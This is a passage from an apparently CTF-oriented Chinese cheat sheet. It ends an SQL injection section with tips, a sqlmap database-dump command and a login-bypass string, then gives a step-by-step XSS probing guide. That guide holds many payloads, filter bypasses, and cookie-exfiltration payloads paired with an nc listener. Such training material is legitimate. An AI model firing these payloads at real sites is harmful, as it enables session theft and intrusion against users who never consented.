| `-- -` 后面还有原始 SQL 报错 | 注释没生效或编码问题 | 换 `#`/`--+`/`;%00`；请求在 Burp 里发，`#` 用 `%23` |
| union 不回显数字 | 原查询有结果，union 部分没显示 | `id=-1` 或 `and 1=2` 让原查询为空 |
| 响应被 WAF 统一替换 | 拦截后返回同一页 | 看状态码是否变化；换 `waf-bypass` 手法或换注入点 |
| sleep 不生效 | DB 不是 MySQL，或函数被禁 | 按库类型换 `pg_sleep`/`WAITFOR`；禁用时用重查询 benchmark |
| load_file 返回 NULL | 无 FILE 权限 / secure_file_priv 限制 | 确认权限；转读其他路径或确认 flag 是否在库里 |
| 枚举不到 flag 表 | flag 不在当前库或表名不同 | 全库搜 `information_schema.tables where table_name like '%flag%'` |
| 分不清哪种数据库 | 报错提示已泄露 | 报错里出现 `MySQL`/`PostgreSQL`、源码语言（PHP/Python/Java）辅助判断 |
#### 实战要点
1. **第 2 步恒真假是判定「是不是注入」的黄金标准**，比单引号报错可靠得多。
2. 注入确认后优先报错/联合（快、直接出数据），回显都不行再盲注，时间盲注最慢放最后。
3. 手动验证一条链条后，拖库改用 sqlmap 提速：`python3 sqlmap.py -u 'http://target/index.php?id=1' --dbs --batch`。 `--batch` 自动选默认选项。
4. 登录绕过可直接 `' or '1'='1' -- -`（拼进密码/用户名）——但先确认是拼接查询再打，别乱试。
5. 盲注写脚本时统一请求头（Cookie 带登录态），单字符对比用「长度+内容」双重校验。
6. 注入结果可能被多种方式回显（JSON、XML、注释），所有响应 Body 都看一眼，别只看状态码。
7. **flag 大概率在库里**：优先枚举 `information_schema` 找表名含 `flag`/`secret`/`users` 的表，比 load_file 快。
8. 探测确认后直接 sqlmap 提速拖库；但先用一条手工 payload 验证注入点，避免工具误报白耗时间。
### [probe-xss] XSS 快速探测 | easy | XSS;探测;payload | xss探测;alert;onerror
> 快速确认反射/存储 XSS 的最短 payload
#### 这个条目的作用
搜索框、评论、昵称、URL 参数等在页面上「回显用户输入」的位置，都可能存在 XSS。本文教你用最短的 payload 快速确认：先搞清楚输入被拼到了哪里（HTML 节点 / 属性 / JS 字符串），再选对应的闭合手法，最后验证与外带 cookie。
#### 前置条件
- 一个能回显输入的功能点：搜索框（`?q=`）、评论/留言（存储型）、昵称、`?msg=`、`?name=` 等。
- 浏览器 DevTools（F12）用于看回显位置；验证外带时需要你自己机器的监听端口（线下赛 `nc -lvnp 8080`）。

> [!tip] 验证 payload 效果：`<img src=x onerror=alert(document.domain)>` 弹域名证明同源；比赛里经常要打 admin 的 cookie，可用 `location='http://yourip/'+document.cookie` 外带（线下赛可搭本地监听：`nc -lvnp 8080`）。
#### 第 1 步：确认回显位置（最重要的一步）
提交一个「标记串」，再用 F12 看它被插到 HTML 的哪里：
```text
输入: xxzzyy
```
按 F12 → Elements，搜 `xxzzyy`，判断它落在：
1. **HTML 标签之间**（`<div>xxzzyy</div>`）→ 直接插标签/事件；
2. **标签属性内**（`<input value="xxzzyy">`）→ 先闭合引号；
3. **JS 字符串内**（`var x = "xxzzyy";`）→ 先闭合引号/脚本；
4. **`<script>` 代码内** → 直接拼接 JS 语法。
预期结果：你能准确说出「输入被包在什么符号里」，这决定 payload 怎么构造。
如果不行：页面完全不回显 → 不是反射点（可能是存储型要等 admin 触发，或接口只收不显，换功能点测）。
#### 第 2 步：裸回显——直接插进 HTML
输入落在标签之间时，逐个试事件标签（哪个都能弹）：
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```
预期结果：提交 `<img src=x onerror=alert(1)>` 后页面弹窗 `1`。
如果不行：不弹 → 看 F12 Console 报错（可能是 `src=x` 加载失败触发 onerror，本身就是预期），或 `<script>` 被过滤 → 换 `waf-bypass` 手法。
#### 第 3 步：属性内注入——先闭合再插事件
输入被包在 `value="..."`、`href="..."` 等属性里时：
```html
" onmouseover="alert(1)
' autofocus onfocus='alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```
```text
?q=" onmouseover="alert(1)          -- 把原 value 闭合，事件挂进属性
```
预期结果：移动鼠标到输入框触发弹窗（onmouseover）或直接弹（onfocus+autofocus）。
如果不行：只闭合一边还报错 → 把**前后引号都闭合**（`"><img src=x onerror=alert(1)>` 是「出属性+出标签」两步走的标准姿势）。
#### 第 4 步：JS 字符串内注入——先闭合字符串
输入被包进 `var x = '...';` 这类 JS 代码里时：
```html
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
```
```text
?q=';alert(1);//        -- 闭合单引号，加分号执行，// 注释掉后面
```
预期结果：页面执行 `alert(1)`（可配合注释把原 JS 尾巴吃掉，避免语法错误）。
如果不行：弹窗没出现且 Console 有语法错误 → 字符串用了双引号就用 `";` 闭合；输入被拼在 `<script>` 块内时直接用 `</script><script>...` 完全跳出。
#### 第 5 步：过滤绕过速查
| 过滤 | 绕过 |
|---|---|
| 过滤 `<script>` | 换 `<img onerror>`/`<svg onload>`/`<body onload>` 等事件标签 |
| 过滤 `alert(` | 用 ``alert`1` ``（反引号）或 `alert\u00281\u0029` |
| 过滤括号 | `onerror=alert\`1\`` 反引号调用 |
| 过滤关键字 | 大小写混合 `<ImG sRc=x oNeRrOr=alert(1)>`（HTML 标签属性不区分大小写） |
| 过滤引号 | `<img src=x onerror=alert(1)>` 数字/变量直接传 |
| 过滤空格 | `<img/src=x/onerror=alert(1)>` |
| 字符实体 | `onerror=&#97;lert(1)`（被 HTML 实体解码后再执行） |
预期结果：事件向量（img/svg 标签 + `onerror`/`onload`）能在标签过滤下仍然触发。
如果不行：多种过滤叠加（关键字+引号+空格全禁）→ 系统性绕过进入 `waf-bypass-techniques`；DOM XSS（前端生成 HTML，如 `innerHTML` 拼接）单独测。
#### 第 6 步：确认类型与外带
- **反射型**：payload 在 URL 里，只能打「点了你链接的人」。
- **存储型**：payload 存进数据库，admin 一打开就触发——也是打 cookie 的主力场景。
- **DOM 型**：不出现在后端响应里，由前端 JS 处理（`location.hash`、`innerHTML`），payload 在 `#` 后。
外带 admin cookie（需要有你自己能连通的机器）：
```html
<script>location='http://你的IP:8080/'+document.cookie</script>
<img src=x onerror="location='http://你的IP:8080/?c='+document.cookie">
```
```bash
# 自己机器监听
nc -lvnp 8080
```
预期结果：对方打开页面后，你的监听窗口收到带 cookie 的请求行。
如果不行：收不到 → 确认防火墙放行 8080；`document.cookie` 为空说明 cookie 是 HttpOnly（读不到，但能证明 XSS 存在，仍可打 CSRF/钓鱼）。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 弹窗不出现 | 回显位置判断错（包在属性/JS 里用错姿势） | 用 `xxzzyy` 标记串 + F12 精确定位后选对应闭合 |
| 只闭合引号没闭合标签 | 属性内注入不完整 | 用 `"><img src=x onerror=alert(1)>` 完整跳出 |
| `<script>` 被过滤 | 标签黑名单 | 换事件标签（img/svg/body）+ onerror/onload |
| alert 被过滤 | 函数黑名单 | 反引号 ``alert`1` ``、编码 `\u0028`、或 `confirm`/`prompt`/`print` 替代 |
| 提交后页面 500 | payload 破坏了原 JS 语法 | JS 字符串内注入务必用 `;//` 或 `</script>` 完整闭合 |
| 存储型不弹 | 要看被**其他用户**访问才触发 | 提交后等 admin/检测机器人访问；用外带确认触发 |
#### 实战要点
1. **回显位置决定 payload 结构**：HTML 里插标签、属性里闭合引号、JS 里闭合语句，先定位再打。
2. 事件向量比 `<script>` 可靠：`<img onerror>`/`<svg onload>` 能过大多数标签过滤。
3. 反射型 XSS 需要「诱导点击」，比赛里要配合短链接/留言板把 payload 发给目标。
4. 存储型 XSS 是打 admin 的黄金路径：payload 必须稳定（用 `<img>` 自触发，别用 onmouseover 要手滑）。
5. `document.cookie` 外带时把关键字符 URL 编码，防 cookie 里特殊字符破坏请求。
6. 测到 XSS 后别止步：同源下可进一步测 CSRF、键盘记录、钓鱼（`xss-frontend-security` 方向）。